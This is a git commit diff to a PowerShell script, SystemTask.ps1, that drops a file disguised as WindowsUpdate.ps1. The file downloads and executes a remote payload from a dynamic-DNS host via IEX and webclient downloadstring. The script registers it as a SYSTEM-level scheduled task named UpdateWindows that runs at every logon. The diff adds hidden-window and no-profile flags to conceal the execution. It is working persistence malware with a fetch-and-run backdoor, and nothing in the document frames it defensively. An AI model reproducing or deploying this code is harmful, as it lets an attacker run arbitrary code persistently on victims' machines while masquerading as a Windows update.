9d9c4264fb40468bd9af5e02d48c0e69fd477bf3
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2017-03-20 21:18:34 +0700

    Update SystemTask.ps1

--- SystemTask.ps1
+++ SystemTask.ps1
@@ -1,4 +1,4 @@
-powershell echo "powershell.exe -c IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))" > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
+powershell echo 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))"' > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
 powershell schtasks.exe /delete /tn UpdateWindows
 powershell schtasks.exe /ru "SYSTEM" /create /sc ONLOGON /tn UpdateWindows /tr C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
 powershell schtasks.exe /run /sc ONLOGON /tn
